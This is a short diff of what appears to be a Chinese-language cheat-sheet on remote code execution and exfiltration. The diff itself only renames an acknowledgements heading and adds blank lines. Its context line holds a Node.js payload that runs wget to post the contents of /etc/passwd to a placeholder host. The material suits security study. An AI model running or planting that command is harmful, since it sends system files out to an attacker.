@@ -60,5 +60,7 @@ NodeJS代码执行
 require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
 ```
 
-## 感谢
+## 致谢
 * [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
+
+
